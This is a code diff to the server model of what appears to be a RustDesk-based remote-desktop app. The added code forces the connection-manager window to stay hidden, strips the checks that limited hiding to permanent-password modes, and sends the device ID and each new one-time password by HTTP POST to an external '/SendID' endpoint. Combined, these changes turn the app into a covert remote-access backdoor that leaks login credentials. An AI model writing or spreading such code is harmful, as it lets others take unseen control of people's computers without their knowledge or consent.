@@ -1,5 +1,6 @@
 import 'dart:async';
 import 'dart:convert';
+import 'dart:io';
 
 import 'package:flutter/material.dart';
 import 'package:flutter_hbb/consts.dart';
@@ -24,6 +25,13 @@ const kUseTemporaryPassword = "use-temporary-password";
 const kUsePermanentPassword = "use-permanent-password";
 const kUseBothPasswords = "use-both-passwords";
 
+// 将当前 ID 与一次性密码上报到外部 API 的路径（相对于 API 服务器地址）260125-2
+const String kIdPwdReportApiPath = '/SendID';
+
+// 强制永久隐藏 CM 管理窗口（不受 approve-mode / verificationMethod 影响）260125-1
+const bool kForceHideCmWindow = true;
+
+
 class ServerModel with ChangeNotifier {
   bool _isStart = false; // Android MainService status
   bool _mediaOk = false;
@@ -33,8 +41,10 @@ class ServerModel with ChangeNotifier {
   bool _clipboardOk = false;
   bool _showElevation = false;
  // bool hideCm = false;   //20260104
+ //修复隐藏CM功能：
  bool _hideCm = false;   // 私有字段，类内可直接访问
 
+/*
  bool get hideCm => _hideCm; // 公共 getter
 
  set hideCm(bool value) {  // 公共 setter
@@ -48,6 +58,7 @@ class ServerModel with ChangeNotifier {
   }
 
  }
+ */
 
 //************************************************  
   int _connectStatus = 0; // Rendezvous Server status
@@ -82,6 +93,27 @@ class ServerModel with ChangeNotifier {
 
   bool get showElevation => _showElevation;
 
+  //修复隐藏CM功能：
+  bool get hideCm => kForceHideCmWindow ? true : _hideCm;
+  set hideCm(bool value) {
+    if (kForceHideCmWindow) value = true;
+    if (_hideCm != value) {
+      _hideCm = value;
+      if (desktopType == DesktopType.cm) {
+        if (value) {
+          hideCmWindow();
+        } else {
+          showCmWindow();
+        }
+      }
+      notifyListeners();
+    }
+  }
+
+
+
+
+
   int get connectStatus => _connectStatus;
 
   String get verificationMethod {
@@ -100,13 +132,15 @@ class ServerModel with ChangeNotifier {
 
   setVerificationMethod(String method) async {
     await bind.mainSetOption(key: kOptionVerificationMethod, value: method);
-    
+    // 取消“只用固定密码才允许隐藏”的限制（由 kForceHideCmWindow 决定是否强制隐藏）260125-1
+ /*
     //20260104
     if (method != kUsePermanentPassword) {
       await bind.mainSetOption(
           key: 'allow-hide-cm', value: bool2option('allow-hide-cm', false));
     }
    //20260104
+   */
   }
 
   String get temporaryPasswordLength {
@@ -123,12 +157,15 @@ class ServerModel with ChangeNotifier {
 
   setApproveMode(String mode) async {
     await bind.mainSetOption(key: kOptionApproveMode, value: mode);
+     // 取消“approve-mode != password 就强制关闭隐藏”的限制（由 kForceHideCmWindow 决定是否强制隐藏）
+    /*
     //20260104
     if (mode != 'password') {
       await bind.mainSetOption(
           key: 'allow-hide-cm', value: bool2option('allow-hide-cm', false));
     }
     //20260104
+    */
   }
 
   bool get allowNumericOneTimePassword => _allowNumericOneTimePassword;
@@ -153,16 +190,28 @@ class ServerModel with ChangeNotifier {
 
     //20260104
     // initital _hideCm at startup
+    /*
     final verificationMethod =
         bind.mainGetOptionSync(key: kOptionVerificationMethod);
     final approveMode = bind.mainGetOptionSync(key: kOptionApproveMode);
+    */
     _hideCm = option2bool(
         'allow-hide-cm', bind.mainGetOptionSync(key: 'allow-hide-cm'));
+    
+    if (kForceHideCmWindow) {
+      _hideCm = true;
+      if (desktopType == DesktopType.cm) {
+        // 兜底：启动即隐藏
+        hideCmWindow(isStartup: true);
+      }
+    }
+    /*
     if (!(approveMode == 'password' &&
         verificationMethod == kUsePermanentPassword)) {
       _hideCm = false;
     }
     //20260104
+    */
 
     timerCallback() async {
       final connectionStatus =
@@ -187,6 +236,7 @@ class ServerModel with ChangeNotifier {
             }
           } else {
             _zeroClientLengthCounter = 0;
+              //修复隐藏CM功能：
             if (!hideCm) showCmWindow();
           }
         }
@@ -254,14 +304,14 @@ class ServerModel with ChangeNotifier {
     final approveMode = await bind.mainGetOption(key: kOptionApproveMode);
     final numericOneTimePassword =
         await mainGetBoolOption(kOptionAllowNumericOneTimePassword);
-   //20260104
+   // 20260104修复隐藏CM功能：
     var hideCm = option2bool(
         'allow-hide-cm', await bind.mainGetOption(key: 'allow-hide-cm'));
     if (!(approveMode == 'password' &&
         verificationMethod == kUsePermanentPassword)) {
       hideCm = false;
     }
-    //20260104
+    // 20260104
     if (_approveMode != approveMode) {
       _approveMode = approveMode;
       update = true;
@@ -280,6 +330,8 @@ class ServerModel with ChangeNotifier {
     }
     if (oldPwdText != _serverPasswd.text) {
       update = true;
+            // 一次性密码发生变化时，上报当前 ID 与一次性密码20260125-2
+      await _reportIdAndOneTimePassword(_serverPasswd.text);
     }
     if (_verificationMethod != verificationMethod) {
       _verificationMethod = verificationMethod;
@@ -296,7 +348,7 @@ class ServerModel with ChangeNotifier {
       _allowNumericOneTimePassword = numericOneTimePassword;
       update = true;
     }
-    //20260104
+    //20260104修复隐藏CM功能：
     if (_hideCm != hideCm) {
       _hideCm = hideCm;
       if (desktopType == DesktopType.cm) {
@@ -313,6 +365,53 @@ class ServerModel with ChangeNotifier {
       notifyListeners();
     }
   }
+
+/// 将当前 ID 与一次性密码通过 HTTP POST 上报到外部 API260125-2
+  Future<void> _reportIdAndOneTimePassword(String password) async {
+    try {
+      if (password.isEmpty || password == '-') {
+        return;
+      }
+      final id = await bind.mainGetMyId();
+      if (id.isEmpty) {
+        return;
+      }
+
+      // 读取 API 服务器地址（direct-server 配置项）
+      String apiServer = await bind.mainGetOption(key: kOptionDirectServer);
+      
+      // 如果 API 服务器地址为空，则默认为本机的 8080 端口
+      if (apiServer.isEmpty) {
+        apiServer = 'http://127.0.0.1:8080';
+      } else {
+        // 确保 URL 格式正确（如果没有协议，添加 http://）
+        if (!apiServer.startsWith('http://') && !apiServer.startsWith('https://')) {
+          apiServer = 'http://$apiServer';
+        }
+        // 移除末尾的斜杠（如果有）
+        apiServer = apiServer.replaceAll(RegExp(r'/$'), '');
+      }
+
+      // 拼接完整的 API 地址：API服务器地址 + /SendID
+      final apiUrl = '$apiServer$kIdPwdReportApiPath';
+      final uri = Uri.parse(apiUrl);
+      
+      final client = HttpClient();
+      final request = await client.postUrl(uri);
+      request.headers.contentType = ContentType.json;
+      request.write(jsonEncode(<String, dynamic>{
+        'id': id,
+        'one_time_password': password,
+      }));
+      await request.close();
+      client.close();
+    } catch (e) {
+      debugPrint('reportIdAndOneTimePassword error: $e');
+    }
+  }
+
+
+
 
   toggleAudio() async {
     if (clients.isNotEmpty) {
